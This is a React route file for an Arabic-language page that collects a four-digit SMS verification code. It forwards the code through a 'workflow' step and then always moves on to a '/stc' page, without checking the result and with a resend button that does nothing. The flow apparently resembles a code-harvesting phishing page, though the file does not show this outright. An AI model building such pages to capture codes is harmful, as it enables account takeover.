import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, ShieldCheck } from "lucide-react";
import { submitCurrentStep } from "@/lib/workflow";

export const Route = createFileRoute("/phone-otp")({
  head: () => ({
    meta: [
      { title: "رمز التحقق — بيكير" },
      { name: "description", content: "أدخل رمز التحقق المرسل إلى جوالك." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: PhoneOtpPage,
});

function PhoneOtpPage() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);

  const setDigit = (i: number, v: string) => {
    if (!/^\d?$/.test(v)) return;
    const next = [...otp];
    next[i] = v;
    setOtp(next);
    if (v && i < 3) {
      const el = document.getElementById(`otp-${i + 1}`);
      el?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await submitCurrentStep("phone_verification", { otp: otp.join("") });
    setLoading(false);
    void navigate({ to: "/stc" });
  };

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <ShieldCheck className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">رمز التحقق</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل الرمز المرسل إلى جوالك المكوّن من 4 أرقام</p>
          </div>

          <form onSubmit={handleSubmit} className="card space-y-5">
            <div className="flex justify-center gap-3" dir="ltr">
              {otp.map((d, i) => (
                <input
                  key={i}
                  id={`otp-${i}`}
                  value={d}
                  onChange={(e) => setDigit(i, e.target.value)}
                  maxLength={1}
                  inputMode="numeric"
                  className="h-16 w-14 rounded-xl border-2 border-dark-200 text-center text-2xl font-bold text-dark-900 focus:border-primary-500 focus:outline-none"
                />
              ))}
            </div>
            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جارٍ التحقق..." : "تأكيد"}
              <ArrowLeft className="h-5 w-5" />
            </button>
            <p className="text-center text-sm text-dark-500">
              لم يصلك رمز؟ <button type="button" className="font-semibold text-primary-600">إعادة إرسال</button>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}
